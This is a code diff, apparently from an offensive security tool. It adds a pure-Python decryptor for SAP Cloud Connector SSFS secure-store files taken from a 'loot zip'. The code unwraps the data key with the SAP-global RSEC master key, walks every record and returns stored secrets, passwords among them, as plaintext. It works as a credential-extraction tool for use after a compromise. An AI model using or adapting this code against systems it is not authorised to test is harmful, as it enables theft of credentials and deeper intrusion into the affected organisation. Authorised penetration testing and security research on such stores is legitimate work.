@@ -199,20 +199,135 @@ def _extract_ssfs_to_tmp(loot_zip_path: str) -> Optional[tuple]:
     return tmp, sid
 
 
+def _parse_ssfs_records(dat_blob: bytes, dek: bytes,
+                        keys_filter: Optional[tuple] = None) -> dict:
+    """Walk a multi-record SSFS .DAT and decrypt each record with ``dek``.
+
+    Layout per pysap SAPSSFS.py SAPSSFSDataRecord:
+        0x00 12  preamble  "RSecSSFsData"
+        0x0C  4  total record length (BE u32)
+        0x10  1  type
+        0x11  7  filler
+        0x18 64  key_name (space-padded ASCII)
+        0x58  8  timestamp
+        0x60 24  user
+        0x78 24  host
+        0x90  1  is_deleted
+        0x91  1  is_stored_as_plaintext
+        0x92  1  is_binary_data
+        0x93  9  filler
+        0x9C 20  HMAC-SHA1 (skipped here — DEK proves authenticity)
+        0xB0  *  ciphertext
+
+    Decrypted payload:
+        0x00  8  preamble (zeros)
+        0x08  4  length (BE u32)
+        0x0C 20  SHA1 over header+data+padding
+        0x20+length  the secret value
+    """
+    from sap_rsec_cipher import rsec_decrypt
+    out = {}
+    pos = 0
+    while pos + 0xB0 <= len(dat_blob):
+        if dat_blob[pos:pos+12] != b"RSecSSFsData":
+            break
+        rec_len = int.from_bytes(dat_blob[pos+0x0C:pos+0x10], "big")
+        if rec_len < 0xB0 or pos + rec_len > len(dat_blob):
+            break
+        record = dat_blob[pos:pos+rec_len]
+        name = record[0x18:0x58].rstrip().decode("ascii", errors="replace")
+        is_plain = record[0x91] == 1
+        is_binary = record[0x92] == 1
+        ciphertext = record[0xB0:]
+        if keys_filter and name not in keys_filter:
+            pos += rec_len
+            continue
+        try:
+            plain = rsec_decrypt(ciphertext, dek)
+            length = int.from_bytes(plain[8:12], "big")
+            value = plain[0x20:0x20+length]
+            # SCC marks even passwords as is_binary_data because Java stores
+            # them as byte arrays — sniff the content for a UTF-16-LE string
+            # (every other byte zero) and decode opportunistically.
+            looks_utf16 = (len(value) >= 2 and len(value) % 2 == 0 and
+                           all(value[i] == 0 for i in range(1, len(value), 2)))
+            if looks_utf16:
+                out[name] = value.decode("utf-16-le")
+            elif is_binary:
+                out[name] = value
+            else:
+                try:
+                    out[name] = value.decode("utf-8")
+                except UnicodeDecodeError:
+                    out[name] = value
+        except Exception:
+            out[name] = None
+        pos += rec_len
+    return out
+
+
+def decrypt_ssfs_pure(loot_zip_path: str, *,
+                      keys: Optional[tuple] = None) -> dict:
+    """Pure-Python SCC SSFS decryptor — no JDK, no libsapscc20jni.
+
+    Two-stage decryption:
+      1. The 24-byte data encryption key (DEK) lives wrapped in the .KEY
+         file at offset 0x82 (57 bytes).  Unwrap with the SAP-global
+         RSEC master key via rsec_decrypt_key.
+      2. Walk every record in .DAT, slicing ciphertext at offset 0xB0,
+         and decrypt each with the DEK using rsec_decrypt.
+
+    Returns the same shape as decrypt_ssfs() so callers are interchangeable.
+    """
+    try:
+        from sap_rsec_cipher import rsec_decrypt_key
+    except Exception as e:
+        return {"ok": False, "error": f"sap_rsec_cipher not importable: {e}"}
+    if not os.path.isfile(loot_zip_path):
+        return {"ok": False, "error": f"loot zip not found: {loot_zip_path}"}
+    try:
+        zf = zipfile.ZipFile(loot_zip_path)
+    except Exception as e:
+        return {"ok": False, "error": f"cannot open loot zip: {e}"}
+    members = {i.filename: i for i in zf.infolist()}
+    key_m = members.get("scc_config/SSFS_SCC.KEY")
+    dat_m = members.get("scc_config/SSFS_SCC.DAT")
+    if not (key_m and dat_m):
+        return {"ok": False, "error": "loot zip lacks SSFS_SCC.KEY/.DAT"}
+    key_blob = zf.read(key_m)
+    dat_blob = zf.read(dat_m)
+    if len(key_blob) < 0xbb:
+        return {"ok": False, "error": f".KEY file too short ({len(key_blob)}B)"}
+    try:
+        dek = rsec_decrypt_key(key_blob[0x82:0xbb])
+    except Exception as e:
+        return {"ok": False, "error": f"DEK derivation failed: {e}"}
+    secrets = _parse_ssfs_records(dat_blob, dek, keys_filter=keys)
+    sid = _detect_ssfs_sid(dat_blob) or _detect_ssfs_sid(key_blob) or "SCC"
+    return {"ok": True, "secrets": secrets, "native_lib": "(pure-python)",
+            "helper_jar": "(pure-python)", "sid": sid}
+
+
 def decrypt_ssfs(loot_zip_path: str, *,
                  scc_native_lib: Optional[str] = None,
                  helper_jar: Optional[str] = None,
                  java_bin: str = "java",
                  sid: str = "SCC",
                  timeout: float = 30.0,
-                 keys: Optional[tuple] = None
+                 keys: Optional[tuple] = None,
+                 prefer_pure: bool = True
                  ) -> dict:
-    """Run the JNI helper against the SSFS pulled from the loot zip.
+    """Decrypt the SSFS bundle from ``loot_zip_path``.
 
-    Returns ``{ok, secrets: {key: plaintext|None}, error}``.  ``secrets``
-    is the parsed JSON dict from the helper.  Caller is responsible for
-    persisting the values securely.
+    With ``prefer_pure=True`` (the default), tries the pure-Python decryptor
+    first — no JDK or libsapscc20jni required.  Falls back to the JNI helper
+    if the pure-Python path errors out.
     """
+    if prefer_pure:
+        pure = decrypt_ssfs_pure(loot_zip_path, keys=keys)
+        if pure.get("ok"):
+            return pure
+        # else fall through to JNI helper as a backstop
     if not os.path.isfile(loot_zip_path):
         return {"ok": False, "error": f"loot zip not found: {loot_zip_path}"}
     jar = helper_jar or find_helper_jar()
